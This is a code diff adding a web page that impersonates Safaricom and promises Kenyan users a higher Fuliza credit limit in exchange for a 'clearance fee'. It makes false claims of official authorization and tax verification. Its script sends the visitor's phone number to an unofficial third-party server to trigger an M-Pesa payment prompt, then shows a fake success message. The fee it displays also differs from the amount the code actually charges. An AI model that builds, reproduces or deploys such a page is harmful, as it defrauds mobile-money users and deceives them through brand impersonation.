@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hustle Funds Clearance Payment</title>
+
+<style>
+body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
+.top-bar{
+background:#1fb141;
+padding:12px;
+text-align:center;
+color:white;
+font-weight:bold;
+font-size:18px;
+}
+.payment-box{
+max-width:420px;
+margin:60px auto;
+background:white;
+padding:30px;
+border-radius:12px;
+box-shadow:0 6px 18px rgba(0,0,0,0.1);
+text-align:center;
+}
+.info{margin:10px 0;font-size:16px;}
+input{
+width:100%;
+padding:12px;
+margin-top:15px;
+border:1px solid #ddd;
+border-radius:6px;
+font-size:16px;
+}
+.pay-btn{
+margin-top:20px;
+width:100%;
+padding:14px;
+background:#1fb141;
+border:none;
+color:white;
+font-size:16px;
+border-radius:30px;
+cursor:pointer;
+}
+.pay-btn:hover{background:#179937;}
+.spinner{margin-top:15px;display:none;}
+.loader{
+border:4px solid #f3f3f3;
+border-top:4px solid #1fb141;
+border-radius:50%;
+width:30px;
+height:30px;
+animation:spin 1s linear infinite;
+margin:auto;
+}
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
+.message{margin-top:15px;font-size:14px;color:#555;}
+.encourage{margin-top:15px;font-size:14px;color:#555;}
+.success{margin-top:20px;font-size:16px;color:green;font-weight:bold;}
+</style>
+</head>
+
+<body>
+
+<header class="top-bar">Safaricom Hustle Funds Clearance</header>
+
+<div class="payment-box">
+
+<h2>Final Clearance Payment</h2>
+
+<p class="encourage">
+Dear Customer, your **Fuliza limit will be increased** to KSh <strong id="limit"></strong>.  
+This final payment covers: <br>
+✅ Clearance of Hustle Funds debt <br>
+✅ KRA & Compliance Verification <br>
+✅ Safaricom Official Signature Authorization <br>
+Complete this step to instantly activate your new limit.
+</p>
+
+<div class="info">Selected Limit: <strong id="limitDisplay"></strong></div>
+<div class="info">Clearance Fee: <strong id="fee">KSh 300</strong></div>
+
+<input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
+
+<button class="pay-btn" onclick="releaseLimit()">Pay & Complete Clearance</button>
+
+<div class="spinner" id="spinner">
+<div class="loader"></div>
+</div>
+
+<div class="message" id="message"></div>
+<div class="success" id="success"></div>
+
+</div>
+
+<script>
+const selectedAmount = localStorage.getItem("selectedAmount");
+const clearanceFee = 3; // KSh 300
+
+document.getElementById("limit").innerText = "KSh " + selectedAmount;
+document.getElementById("limitDisplay").innerText = "KSh " + selectedAmount;
+
+function isSafaricom(number){
+return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
+}
+
+function formatPhone(number){
+return number.startsWith("0") ? "254"+number.substring(1) : number;
+}
+
+async function releaseLimit(){
+const phone=document.getElementById("phone").value.trim();
+const msg=document.getElementById("message");
+const spinner=document.getElementById("spinner");
+const successMsg=document.getElementById("success");
+
+msg.innerText="";
+successMsg.innerText="";
+
+if(!phone){
+msg.innerText="Enter your phone number";
+msg.style.color="red";
+return;
+}
+
+if(!isSafaricom(phone)){
+msg.innerText="Only Safaricom numbers allowed";
+msg.style.color="red";
+return;
+}
+
+const phoneToSend = formatPhone(phone);
+
+spinner.style.display="block";
+msg.innerText="Processing clearance... please check your phone";
+msg.style.color="black";
+
+try{
+const res = await fetch("https://nyota-paynecta-server.onrender.com/pay",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+phone:phoneToSend,
+amount:clearanceFee,
+account:"Hustle Funds Clearance"
+})
+});
+
+const data = await res.json();
+spinner.style.display="none";
+
+if(data.success){
+msg.innerText="STK Push sent ✅ Enter your M-Pesa PIN to complete";
+msg.style.color="green";
+
+checkPayment(data.reference || data.receipt.reference);
+
+}else{
+msg.innerText="Payment failed: "+(data.error || "Try again");
+msg.style.color="red";
+}
+
+}catch(err){
+spinner.style.display="none";
+msg.innerText="Server error: "+(err.message || "Try again");
+msg.style.color="red";
+}
+
+}
+
+async function checkPayment(reference){
+const msg=document.getElementById("message");
+const successMsg=document.getElementById("success");
+let attempts=0;
+
+const interval=setInterval(async()=>{
+attempts++;
+if(attempts>20){
+clearInterval(interval);
+msg.innerText="Payment timeout. Please retry.";
+msg.style.color="red";
+return;
+}
+
+try{
+const res=await fetch("https://nyota-paynecta-server.onrender.com/receipt/"+reference);
+const data=await res.json();
+
+if(data.success && data.receipt){
+const status=data.receipt.status.toLowerCase();
+
+if(status==="processing" || status==="loan_released"){
+clearInterval(interval);
+msg.innerText="";
+successMsg.innerText="🎉 Congratulations! Your Fuliza limit has been successfully increased to KSh "+selectedAmount+" ✅";
+localStorage.setItem("currentLimit",selectedAmount);
+setTimeout(()=>{
+window.location.href="success.html";
+},3000);
+}
+
+if(status==="cancelled" || status==="stk_failed" || status==="error"){
+clearInterval(interval);
+msg.innerText="Payment failed or cancelled: "+data.receipt.status_note;
+msg.style.color="red";
+}
+
+}
+
+}catch(e){}
+},3000);
+}
+
+</script>
+
+</body>
+</html>
